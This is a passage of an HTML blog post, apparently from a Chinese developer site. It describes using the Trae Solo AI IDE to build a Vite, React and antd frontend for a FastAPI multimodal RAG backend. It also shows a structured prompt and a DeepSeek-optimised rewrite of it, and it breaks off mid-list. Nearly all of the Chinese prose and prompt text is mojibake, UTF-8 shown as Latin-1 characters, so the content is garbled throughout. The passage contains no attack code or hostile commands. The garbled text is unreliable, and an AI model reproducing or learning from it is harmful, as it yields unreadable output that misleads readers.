<p>é¦–å…ˆåœ¨åŒ…å«åç«¯ä»£ç çš„é¡¹ç›®æ–‡ä»¶å¤¹ä¸­æ‰“å¼€Traeï¼Œè¿™æ ·åœ¨å‘Traeè¿›è¡Œæé—®æ—¶Traeå°±ä¼šè‡ªåŠ¨åˆ†æä¸Šä¸‹æ–‡åç«¯ä»£ç ä¸­çš„å†…å®¹ï¼Œæ›´ç²¾ç¡®çš„ä¾æ®åç«¯æ¥å£ç”Ÿæˆå‰ç«¯é¡µé¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/229d61ff29ff455ebc61980ab8adbba7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=ekNUIpUkS9yMhXi38zoCl5OYJG0%3D" alt="5.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.1 ç¼–å†™ç»“æ„åŒ–æç¤ºè¯</h3>
<p>ä¾æ®æŒ‡å—ç¬¬ä¸€æ­¥ï¼Œé¦–å…ˆéœ€è¦æ„å»ºä¸€ä»½ç»“æ„æ¸…æ™°ã€è¦ç´ å®Œæ•´çš„åŸå§‹æç¤ºè¯ã€‚</p>
<ol>
<li><strong>è§’è‰²å®šä½ï¼š</strong> æ˜ç¡®èµ‹äºˆ <strong>Trae Solo</strong> ä¸€ä¸ªä¸“ä¸šèº«ä»½å’Œèƒ½åŠ›èŒƒå›´</li>
</ol>
<pre><code class="hljs language-text" lang="text">ä½ æ˜¯ä¸€åå‰ç«¯ç¼–ç¨‹å¤§å¸ˆï¼Œ
å…·å¤‡ç†Ÿç»ƒè¿ç”¨React+TypeScriptç»„ä»¶åŒ–å¼€å‘çš„æŠ€èƒ½ï¼Œ
ç†Ÿç»ƒè¿ç”¨TailWind CSS + antdæ„å»ºç°ä»£åŒ–æ¡†æ¶æ ·å¼ä¸ç»„ä»¶åº“çš„æŠ€èƒ½ï¼Œ
å…·å¤‡ä½¿ç”¨viteè„šæ‰‹æ¶å¼€å‘å‰ç«¯é¡¹ç›®çš„æŠ€èƒ½ï¼Œ
èƒ½å¤Ÿå®Œæˆç”¨æˆ·æå‡ºçš„æ‰€æœ‰éœ€æ±‚ã€‚
</code></pre>
<ol start="2">
<li><strong>æ¸…æ™°çš„éœ€æ±‚ï¼š</strong> è¯¦ç»†æè¿°ä¸šåŠ¡åœºæ™¯ä¸åŠŸèƒ½ç‚¹</li>
</ol>
<pre><code class="hljs language-text" lang="text">åœ¨backend/srcæ–‡ä»¶å¤¹ä¸‹æ˜¯æˆ‘åˆ©ç”¨fastapiç¼–å†™çš„åç«¯ä»£ç ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚æ¥å£å®Œæˆå¤§æ¨¡å‹æ™ºèƒ½é—®ç­”ã€å¤§æ¨¡å‹å›¾ç‰‡åˆ†æã€å¤§æ¨¡å‹éŸ³é¢‘è½¬å†™ã€å¤§æ¨¡å‹PDFé—®ç­”è§£æå››ä¸ªåŠŸèƒ½ã€‚
è¯¥å‰ç«¯é¡¹ç›®åç§°ä¸ºå¤šæ¨¡æ€å¤§æ¨¡å‹RAGç³»ç»Ÿï¼Œç”¨æˆ·è¿›å…¥åé¦–å…ˆä¼šæœ‰ä¸€ä¸ªæ’åˆ—æ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™å’ŒPDFè§£æçš„å››ä¸ªåŠŸèƒ½é€‰é¡¹ï¼Œé€‰æ‹©åŠŸèƒ½é€‰é¡¹ä¼šè¿›å…¥ä¸å¤§æ¨¡å‹çš„å¯¹è¯æ¡†ã€‚
åœ¨æ™ºèƒ½é—®ç­”é€‰é¡¹ä¸­ç”¨æˆ·å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”ã€‚
åœ¨å›¾ç‰‡åˆ†æé€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œå¤§æ¨¡å‹ä¾æ®å›¾ç‰‡å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
åœ¨éŸ³é¢‘è½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ éŸ³é¢‘ï¼Œå¤§æ¨¡å‹ä¾æ®éŸ³é¢‘å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
åœ¨PDFè½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ PDFï¼Œå¤§æ¨¡å‹ä¾æ®PDFå†…å®¹ä½œä¸ºå‚ç…§å¯¹ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ï¼Œå›ç­”ä¸­è¿˜åŒ…å«å¯¹PDFçš„å¼•ç”¨ã€‚ä¸å¤§æ¨¡å‹çš„å¯¹è¯éƒ½ä»¥æµå¼è¾“å‡ºçš„æ–¹å¼è¾“å‡ºã€‚
</code></pre>
<ol start="3">
<li><strong>æ˜ç¡®çš„ä»»åŠ¡</strong>ï¼šå°†éœ€æ±‚è½¬åŒ–ä¸ºå…·ä½“çš„å¼€å‘æŒ‡ä»¤</li>
</ol>

<pre><code class="hljs language-swift" lang="swift">è¯·åœ¨ä¿æŒæˆ‘åç«¯æ ¸å¿ƒä»£ç ä¸å‘ç”Ÿå¤§è§„æ¨¡å˜åŠ¨çš„å‰æä¸‹ï¼Œ
ä½¿ç”¨viteè„šæ‰‹æ¶ï¼Œåˆ©ç”¨reactæ¡†æ¶ï¼Œantd <span class="hljs-type">UIåº“</span>
å¸®æˆ‘æ„å»ºä¸€ä¸ªå‰ç«¯é¡¹ç›®ç”¨æˆ·è¯·æ±‚æˆ‘çš„åç«¯æ¥å£<span class="hljs-operator">ã€‚</span>
</code></pre>
<p>4.  <strong>ä»£ç è§„èŒƒçº¦æŸï¼š</strong> ä¸ºé˜²æ­¢ä»£ç é£æ ¼å¤±æ§ï¼Œå¿…é¡»æå‰çº¦å®šè§„èŒƒ</p>

<pre><code class="hljs language-scss" lang="scss">åœ¨å‰ç«¯ç¼–å†™ä¸­ï¼Œä½ åº”è¯¥éµå¾ªå¦‚ä¸‹è§„èŒƒï¼Œç¡®ä¿å‰ç«¯ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼š
(<span class="hljs-number">1</span>) ç»„ä»¶è®¾è®¡é‡‡ç”¨å®¹å™¨/å±•ç¤ºåˆ†ç¦»é€»è¾‘ä¸è§†å›¾ï¼Œå®¹å™¨ç»„ä»¶ï¼šç®¡ç†æ•°æ®ã€çŠ¶æ€å’Œé€»è¾‘ã€‚å±•ç¤ºç»„ä»¶ï¼šæ¥æ”¶propsæ¸²æŸ“UIï¼Œé€šå¸¸æ— çŠ¶æ€ã€‚ 
(<span class="hljs-number">2</span>) ç›®å½•ç»“æ„æŒ‰ä¸šåŠ¡æˆ–åŠŸèƒ½æ¨¡å—ç»„ç»‡ï¼Œç»„ä»¶ä¸é¡µé¢åˆ†å¼€å­˜æ”¾ï¼Œ<span class="hljs-attribute">src</span>/pages/ å­˜æ”¾é¡µé¢ï¼Œ<span class="hljs-attribute">src</span>/components/ å­˜æ”¾å…¬å…±ç»„ä»¶ï¼Œ<span class="hljs-attribute">src</span>/modules/ å­˜æ”¾ä¸šåŠ¡æ¨¡å—ã€‚
(<span class="hljs-number">3</span>) å¯¼å…¥å¯¼å‡ºä¿æŒå¯¼å…¥å¯¼å‡ºæ¸…æ™°ä¸€è‡´ï¼Œä¼˜å…ˆä½¿ç”¨å…·åå¯¼å‡ºï¼Œå•æ–‡ä»¶å•ç»„ä»¶ï¼šå¯ç”¨é»˜è®¤å¯¼å‡ºã€‚å•æ–‡ä»¶å¤šç»„ä»¶/å·¥å…·ï¼šå¿…é¡»ç”¨å…·åå¯¼å‡ºã€‚å¯¼å…¥é¡ºåºï¼šåº“ -&gt; ç»„ä»¶ -&gt; èµ„æº -&gt; æ ·å¼ã€‚ 
(<span class="hljs-number">4</span>) æ ·å¼ç®¡ç†é¿å…å…¨å±€æ ·å¼æ±¡æŸ“ï¼Œç»„ä»¶æ ·å¼ç‹¬ç«‹ç®¡ç†ã€‚CSS Modules/Styled Componentsï¼šæ¨èã€‚è¦†ç›–Antdæ ·å¼ï¼šé€šè¿‡è‡ªå®šä¹‰ç±»åæˆ–ä½¿ç”¨configProviderå…¨å±€é…ç½®ã€‚
(<span class="hljs-number">5</span>) è·¯ç”±ä¸é¡µé¢ä½¿ç”¨è·¯ç”±å®ç°é¡µé¢çº§ä»£ç åˆ†å‰²ï¼ŒæŒ‰éœ€åŠ è½½ã€‚é…ç½®é¡µé¢è·¯ç”±ï¼š/pages/Home/index<span class="hljs-selector-class">.jsx</span> -&gt; /homeã€‚æ‡’åŠ è½½é¡µé¢ç»„ä»¶ï¼šä½¿ç”¨ React<span class="hljs-selector-class">.lazy</span>() å’Œ Suspense
</code></pre>
<h3 data-id="heading-7">2.2 DeepSeekæç¤ºè¯ä¼˜åŒ–</h3>
<p>åŸå§‹æç¤ºè¯å·²ç»å…·å¤‡äº†æ‰€æœ‰è¦ç´ ï¼Œä½†å…¶è¡¨è¿°åå‘â€œå¤§ç™½è¯â€ï¼Œé€»è¾‘è¿è´¯æ€§æœ‰å¾…åŠ å¼ºã€‚ç°åœ¨ç¬”è€…æ‰§è¡Œç¬¬äºŒæ­¥ï¼šä½¿ç”¨å¦ä¸€ä¸ªå¤§æ¨¡å‹ï¼ˆè¿™é‡Œé€‰ç”¨ DeepSeekï¼‰å¯¹æç¤ºè¯è¿›è¡Œä¼˜åŒ–ï¼Œä½¿å…¶æ›´ç¬¦åˆå¤§æ¨¡å‹çš„â€œé˜…è¯»ä¹ æƒ¯â€ã€‚</p>
<p><strong>åŸå§‹è¾“å…¥æç¤ºè¯:</strong></p>
<pre><code class="hljs language-text" lang="text">æˆ‘æƒ³è¦ä¸ºæˆ‘fastapiçš„åç«¯ç¼–å†™ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œè¯·å¯¹æˆ‘çš„æç¤ºè¯è¿›è¡Œä¼˜åŒ–ï¼Œä½¿æç¤ºè¯æ¡ç†æ¸…æ™°ï¼Œé€»è¾‘é€šé¡ºã€‚æˆ‘çš„æç¤ºè¯å¦‚ä¸‹ï¼š
â€œä½ æ˜¯ä¸€åå‰ç«¯ç¼–ç¨‹å¤§å¸ˆï¼Œå…·å¤‡ç†Ÿç»ƒè¿ç”¨React+TypeScriptç»„ä»¶åŒ–å¼€å‘çš„æŠ€èƒ½ï¼Œç†Ÿç»ƒè¿ç”¨TailWind CSS + antdæ„å»ºç°ä»£åŒ–æ¡†æ¶æ ·å¼ä¸ç»„ä»¶åº“çš„æŠ€èƒ½ï¼Œå…·å¤‡ä½¿ç”¨viteè„šæ‰‹æ¶å¼€å‘å‰ç«¯é¡¹ç›®çš„æŠ€èƒ½ï¼Œèƒ½å¤Ÿå®Œæˆç”¨æˆ·æå‡ºçš„æ‰€æœ‰éœ€æ±‚ã€‚ åœ¨backend/srcæ–‡ä»¶å¤¹ä¸‹æ˜¯æˆ‘åˆ©ç”¨fastapiç¼–å†™çš„åç«¯ä»£ç ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚æ¥å£å®Œæˆå¤§æ¨¡å‹æ™ºèƒ½é—®ç­”ã€å¤§æ¨¡å‹å›¾ç‰‡åˆ†æã€å¤§æ¨¡å‹éŸ³é¢‘è½¬å†™ã€å¤§æ¨¡å‹PDFé—®ç­”è§£æå››ä¸ªåŠŸèƒ½ã€‚ è¯·åœ¨ä¿æŒæˆ‘åç«¯æ ¸å¿ƒä»£ç ä¸å‘ç”Ÿå¤§è§„æ¨¡å˜åŠ¨çš„å‰æä¸‹ï¼Œä½¿ç”¨viteè„šæ‰‹æ¶ï¼Œåˆ©ç”¨reactæ¡†æ¶ï¼Œantd UIåº“å¸®æˆ‘æ„å»ºä¸€ä¸ªå‰ç«¯é¡¹ç›®ç”¨æˆ·è¯·æ±‚æˆ‘çš„åç«¯æ¥å£ã€‚ è¯¥å‰ç«¯é¡¹ç›®åç§°ä¸ºå¤šæ¨¡æ€å¤§æ¨¡å‹RAGç³»ç»Ÿï¼Œç”¨æˆ·è¿›å…¥åé¦–å…ˆä¼šæœ‰ä¸€ä¸ªæ’åˆ—æ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™å’ŒPDFè§£æçš„å››ä¸ªåŠŸèƒ½é€‰é¡¹ï¼Œé€‰æ‹©åŠŸèƒ½é€‰é¡¹ä¼šè¿›å…¥ä¸å¤§æ¨¡å‹çš„å¯¹è¯æ¡†ï¼Œåœ¨æ™ºèƒ½é—®ç­”é€‰é¡¹ä¸­ç”¨æˆ·å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”ã€‚åœ¨å›¾ç‰‡åˆ†æé€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œå¤§æ¨¡å‹ä¾æ®å›¾ç‰‡å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚åœ¨éŸ³é¢‘è½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ éŸ³é¢‘ï¼Œå¤§æ¨¡å‹ä¾æ®éŸ³é¢‘å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚åœ¨PDFè½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ PDFï¼Œå¤§æ¨¡å‹ä¾æ®PDFå†…å®¹ä½œä¸ºå‚ç…§å¯¹ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ï¼Œå›ç­”ä¸­è¿˜åŒ…å«å¯¹PDFçš„å¼•ç”¨ã€‚ä¸å¤§æ¨¡å‹çš„å¯¹è¯éƒ½ä»¥æµå¼è¾“å‡ºçš„æ–¹å¼è¾“å‡ºã€‚ åœ¨å‰ç«¯ç¼–å†™ä¸­ï¼Œä½ åº”è¯¥éµå¾ªå¦‚ä¸‹è§„èŒƒï¼Œç¡®ä¿å‰ç«¯ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼š (1) ç»„ä»¶è®¾è®¡é‡‡ç”¨å®¹å™¨/å±•ç¤ºåˆ†ç¦»é€»è¾‘ä¸è§†å›¾ï¼Œå®¹å™¨ç»„ä»¶ï¼šç®¡ç†æ•°æ®ã€çŠ¶æ€å’Œé€»è¾‘ã€‚å±•ç¤ºç»„ä»¶ï¼šæ¥æ”¶propsæ¸²æŸ“UIï¼Œé€šå¸¸æ— çŠ¶æ€ã€‚ (2) ç›®å½•ç»“æ„æŒ‰ä¸šåŠ¡æˆ–åŠŸèƒ½æ¨¡å—ç»„ç»‡ï¼Œç»„ä»¶ä¸é¡µé¢åˆ†å¼€å­˜æ”¾ï¼Œsrc/pages/ å­˜æ”¾é¡µé¢ï¼Œsrc/components/ å­˜æ”¾å…¬å…±ç»„ä»¶ï¼Œsrc/modules/ å­˜æ”¾ä¸šåŠ¡æ¨¡å—ã€‚ (3) å¯¼å…¥å¯¼å‡ºä¿æŒå¯¼å…¥å¯¼å‡ºæ¸…æ™°ä¸€è‡´ï¼Œä¼˜å…ˆä½¿ç”¨å…·åå¯¼å‡ºï¼Œå•æ–‡ä»¶å•ç»„ä»¶ï¼šå¯ç”¨é»˜è®¤å¯¼å‡ºã€‚å•æ–‡ä»¶å¤šç»„ä»¶/å·¥å…·ï¼šå¿…é¡»ç”¨å…·åå¯¼å‡ºã€‚å¯¼å…¥é¡ºåºï¼šåº“ -&gt; ç»„ä»¶ -&gt; èµ„æº -&gt; æ ·å¼ã€‚ (4) æ ·å¼ç®¡ç†é¿å…å…¨å±€æ ·å¼æ±¡æŸ“ï¼Œç»„ä»¶æ ·å¼ç‹¬ç«‹ç®¡ç†ã€‚CSS Modules/Styled Componentsï¼šæ¨èã€‚è¦†ç›–Antdæ ·å¼ï¼šé€šè¿‡è‡ªå®šä¹‰ç±»åæˆ–ä½¿ç”¨configProviderå…¨å±€é…ç½®ã€‚ (5) è·¯ç”±ä¸é¡µé¢ä½¿ç”¨è·¯ç”±å®ç°é¡µé¢çº§ä»£ç åˆ†å‰²ï¼ŒæŒ‰éœ€åŠ è½½ã€‚é…ç½®é¡µé¢è·¯ç”±ï¼š/pages/Home/index.jsx -&gt; /homeã€‚æ‡’åŠ è½½é¡µé¢ç»„ä»¶ï¼šä½¿ç”¨ React.lazy() å’Œ Suspense â€
</code></pre>
<p><strong>DeepSeekä¼˜åŒ–åç»“æœ:</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-strong">**è§’è‰²ä¸æŠ€èƒ½å®šä½**</span>  
ä½ æ˜¯ä¸€åèµ„æ·±å‰ç«¯å·¥ç¨‹å¸ˆï¼Œç²¾é€šä»¥ä¸‹æŠ€æœ¯æ ˆï¼š

<span class="hljs-bullet">-</span>   React + TypeScript çš„ç»„ä»¶åŒ–å¼€å‘
<span class="hljs-bullet">-</span>   Tailwind CSS + Ant Design (antd) ç”¨äºç°ä»£åŒ– UI æ„å»º
<span class="hljs-bullet">-</span>   Vite è„šæ‰‹æ¶è¿›è¡Œé¡¹ç›®å¼€å‘ä¸æ„å»º

<span class="hljs-strong">**é¡¹ç›®æ¦‚è¿°**</span>  
æˆ‘å·²åœ¨Â <span class="hljs-code">`backend/src`</span>Â ä¸‹åŸºäº FastAPI å¼€å‘äº†åç«¯æœåŠ¡ï¼Œæ”¯æŒä»¥ä¸‹å››ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š

<span class="hljs-bullet">1.</span>  å¤§æ¨¡å‹æ™ºèƒ½é—®ç­”
<span class="hljs-bullet">2.</span>  å¤§æ¨¡å‹å›¾ç‰‡åˆ†æ
<span class="hljs-bullet">3.</span>  å¤§æ¨¡å‹éŸ³é¢‘è½¬å†™
<span class="hljs-bullet">4.</span>  å¤§æ¨¡å‹ PDF é—®ç­”è§£æ

ç°éœ€è¦ä½ åŸºäºç°æœ‰åç«¯ï¼Œä½¿ç”¨Â <span class="hljs-strong">**Vite + React + TypeScript + antd + Tailwind CSS**</span>Â å¼€å‘ä¸€ä¸ªå‰ç«¯é¡¹ç›®ï¼Œé¡¹ç›®å‘½åä¸ºÂ  <span class="hljs-strong">**â€œå¤šæ¨¡æ€å¤§æ¨¡å‹RAGç³»ç»Ÿâ€**</span> ã€‚åç«¯æ ¸å¿ƒä»£ç åº”ä¿æŒä¸å˜ï¼Œå‰ç«¯é€šè¿‡è°ƒç”¨æ¥å£ä¸åç«¯äº¤äº’ã€‚

<span class="hljs-strong">**æ ¸å¿ƒåŠŸèƒ½éœ€æ±‚**</span>

<span class="hljs-bullet">1.</span>  <span class="hljs-strong">**é¦–é¡µå¯¼èˆª**</span>

<span class="hljs-bullet">    -</span>   è¿›å…¥ç³»ç»Ÿåï¼Œé¦–é¡µæ¸…æ™°å±•ç¤ºå››ä¸ªåŠŸèƒ½å…¥å£ï¼šæ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™ã€PDFè§£æã€‚

<span class="hljs-bullet">2.</span>  <span class="hljs-strong">**åŠŸèƒ½é¡µé¢ä¸äº¤äº’**</span>

<span class="hljs-bullet">    -</span>   æ¯ä¸ªåŠŸèƒ½å¯¹åº”ä¸€ä¸ªç‹¬ç«‹çš„å¯¹è¯é¡µé¢ï¼Œæ”¯æŒç”¨æˆ·ä¸å¤§æ¨¡å‹è¿›è¡Œ<span class="hljs-strong">**æµå¼å¯¹è¯**</span>ï¼ˆç­”æ¡ˆé€æ­¥è¾“å‡ºï¼‰ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**æ™ºèƒ½é—®ç­”**</span>ï¼šçº¯æ–‡æœ¬å¯¹è¯ç•Œé¢ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**å›¾ç‰‡åˆ†æ**</span>ï¼šåœ¨å¯¹è¯åŸºç¡€ä¸Šï¼Œæ”¯æŒä¸Šä¼ å›¾ç‰‡ï¼Œæ¨¡å‹ä¾æ®å›¾ç‰‡å†…å®¹ä¸ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**éŸ³é¢‘è½¬å†™**</span>ï¼šåœ¨å¯¹è¯åŸºç¡€ä¸Šï¼Œæ”¯æŒä¸Šä¼ éŸ³é¢‘ï¼Œæ¨¡å‹ä¾æ®éŸ³é¢‘å†…å®¹ä¸ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
<span class="hljs-bullet">    -</span>   <span class="hljs-strong">**PDFè§£æ**</span>ï¼šåœ¨å¯¹è¯åŸºç¡€ä¸Šï¼Œæ”¯æŒä¸Šä¼ PDFï¼Œæ¨¡å‹ä»¥PDFå†…å®¹ä¸ºå‚ç…§å›ç­”é—®é¢˜ï¼Œå¹¶åœ¨ç­”æ¡ˆä¸­æä¾›å¼•ç”¨æ¥æºã€‚

<span class="hljs-strong">**å‰ç«¯ä»£ç è§„èŒƒ**</span>  
è¯·ä¸¥æ ¼æŒ‰ç…§ä»¥ä¸‹æ¶æ„ä¸è§„èŒƒè¿›è¡Œå¼€å‘ï¼š

<span class="hljs-bullet">3.</span>  <span class="hljs-strong">**ç»„ä»¶è®¾è®¡**</span>

<span class="hljs-bullet">    -</span>   é‡‡ç”¨å®¹å™¨ç»„ä»¶ï¼ˆç®¡ç†æ•°æ®ã€çŠ¶æ€ã€é€»è¾‘ï¼‰ä¸å±•ç¤ºç»„ä»¶ï¼ˆæ¥æ”¶ props æ¸²æŸ“ UIï¼‰åˆ†ç¦»çš„æ¨¡å¼ã€‚

<span class="hljs-bullet">4.</span>  <span class="hljs-strong">**ç›®å½•ç»“æ„**</span>

<span class="hljs-bullet">    -</span>   <span class="hljs-code">`src/pages/`</span>ï¼šå­˜æ”¾é¡µé¢çº§ç»„ä»¶ï¼ˆå¦‚ Home, ChatPage ç­‰ï¼‰
<span class="hljs-bullet">    -</span>   <span class="hljs-code">`src/components/`</span>ï¼šå­˜æ”¾å¯å¤ç”¨çš„å…¬å…±ç»„ä»¶
<span class="hljs-bullet">    -</span>   <span class="hljs-code">`src/modules/`</span>ï¼šæŒ‰ä¸šåŠ¡æ¨¡å—ç»„ç»‡ï¼ˆä¾‹å¦‚ï¼šchat, upload, utils ç­‰ï¼‰

<span class="hljs-bullet">5.</span>  <span class="hljs-strong">**å¯¼å…¥å¯¼å‡º**</span>

<span class="hljs-bullet">    -</span>   ä¼˜å…ˆä½¿ç”¨å…·åå¯¼å‡ºï¼›å•æ–‡ä»¶å•ç»„ä»¶å¯ä½¿ç”¨é»˜è®¤å¯¼å‡ºã€‚
<span class="hljs-bullet">    -</span>   å¯¼å…¥é¡ºåºï¼šç¬¬ä¸‰æ–¹åº“ â†’ å†…éƒ¨ç»„ä»¶ â†’ é™æ€èµ„æº â†’ æ ·å¼æ–‡ä»¶ã€‚

<span class="hljs-bullet">6.</span>  <span class="hljs-strong">**æ ·å¼ç®¡ç†**</span>

<span class="hljs-bullet">    -</span>   ä½¿ç”¨ CSS Modules æˆ– Styled Components é¿å…å…¨å±€æ ·å¼æ±¡æŸ“ã€‚
<span class="hljs-bullet">    -</span>   è¦†ç›– antd æ ·å¼æ—¶ï¼Œé€šè¿‡è‡ªå®šä¹‰ç±»åæˆ–Â <span class="hljs-code">`ConfigProvider`</span>Â å…¨å±€é…ç½®å®ç°ã€‚

<span class="hljs-bullet">7.</span>  <span class="hljs-strong">**è·¯ç”±ä¸ä»£ç åˆ†å‰²**</span>

<span class="hljs-bullet">    -</span>   é…ç½®è·¯ç”±æ˜ å°„ï¼ˆä¾‹å¦‚ï¼š<span class="hljs-code">`/pages/Home/index.tsx`</span>Â â†’Â <span class="hljs-code">`/home`</span>ï¼‰ã€‚
<span class="hljs-bullet">    -</span>   ä½¿ç”¨Â <span class="hljs-code">`React.lazy()`</span>Â ä¸Â <span class="hljs-code">`Suspense`</span>Â å®ç°é¡µé¢çº§æ‡’åŠ è½½ï¼Œæå‡æ€§èƒ½ã€‚

<span class="hljs-strong">**è¡¥å……è¦æ±‚**</span>

<span class="hljs-bullet">-</span>   æ‰€æœ‰å¯¹è¯ç•Œé¢éœ€å®ç°<span class="hljs-strong">**æµå¼è¾“å‡º**</span>ï¼ˆServer-Sent Events æˆ– WebSocketï¼‰ã€‚
<span class="hljs-bullet">-</span>   æ–‡ä»¶ä¸Šä¼ ç»„ä»¶éœ€æ”¯æŒå¸¸è§æ ¼å¼ï¼ˆå›¾ç‰‡ï¼šjpg/pngï¼›éŸ³é¢‘ï¼šmp3/wavï¼›PDFï¼špdfï¼‰ï¼Œå¹¶æä¾›ä¸Šä¼ çŠ¶æ€åé¦ˆã€‚
<span class="hljs-bullet">-</span>   ç•Œé¢é£æ ¼ä¿æŒç°ä»£ã€ç®€æ´ï¼Œç¬¦åˆ Ant Design è®¾è®¡è¯­è¨€ï¼Œå¹¶é€‚å½“è¿ç”¨ Tailwind CSS è¿›è¡Œæ ·å¼å®šåˆ¶ã€‚
</code></pre>
<p>ä¼˜åŒ–åçš„æç¤ºè¯å±‚çº§åˆ†æ˜ã€æŒ‡ä»¤æ˜ç¡®ï¼Œæ¶ˆé™¤äº†å†—ä½™å’Œæ­§ä¹‰ã€‚æ­¤æ—¶å°†å…¶æäº¤ç»™ Trae Soloï¼Œèƒ½å¤Ÿç¡®ä¿æŒ‡ä»¤è¢«æœ€é«˜æ•ˆã€æœ€å‡†ç¡®åœ°æ‰§è¡Œã€‚</p>
<h3 data-id="heading-8">2.3 Trae Solo è‡ªåŠ¨å¼€å‘</h3>
<p>ç°åœ¨ç¬”è€…å°†ä¼˜åŒ–åçš„æç¤ºè¯äº¤ç»™ Trae Soloï¼Œå¼€å§‹<strong>Trae Solo</strong>çš„è¡¨æ¼”ã€‚</p>
<ol>
<li>
<p><strong>è¾“å…¥æç¤ºè¯</strong>ï¼šå°†ä¸Šè¿°ä¼˜åŒ–åçš„æ–‡æœ¬ç²˜è´´åˆ° Trae å¯¹è¯æ¡†ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45616db494c342b9ba54e04ecd6ef976~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=N0J5AI32c1OyRInA2DgSsRjtYGk%3D" alt="7.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç¯å¢ƒè‡ªåŠ¨æ­å»º</strong>ï¼šTrae æ¥æ”¶åˆ°æŒ‡ä»¤åï¼Œå¹¶æœªç«‹å³å¼€å§‹ç¼–ç ï¼Œè€Œæ˜¯<strong>é¦–å…ˆåˆ†æåç«¯ä»£ç ç»“æ„</strong>ï¼Œç„¶å<strong>è‡ªåŠ¨æ‰§è¡Œå‘½ä»¤è¡ŒæŒ‡ä»¤</strong>æ¥æ­å»ºå¼€å‘ç¯å¢ƒï¼ˆå¦‚åˆ›å»º Vite é¡¹ç›®ã€å®‰è£…ä¾èµ–ï¼‰ã€‚è¿™ä¸€ç‰¹æ€§æå¤§ç®€åŒ–äº†ç¯å¢ƒé…ç½®æµç¨‹ã€‚ç”¨æˆ·åœ¨ä¸­éƒ¨å¯¹è¯æ¡†çš„è¾“å…¥ï¼Œä¼šè¢«å®æ—¶è½¬åŒ–ä¸ºå³ä¾§ç»ˆç«¯çš„å‘½ä»¤æ‰§è¡Œï¼Œå®ç°äº†è‡ªç„¶è¯­è¨€é©±åŠ¨å¼€å‘ç¯å¢ƒé…ç½®ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c7c0c04f61f439ca51c6118fe77346e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qUaO4JUSZdUmYNGOLcA7qpZfW9k%3D" alt="0.png" loading="lazy"/></p>
</li>
<li>
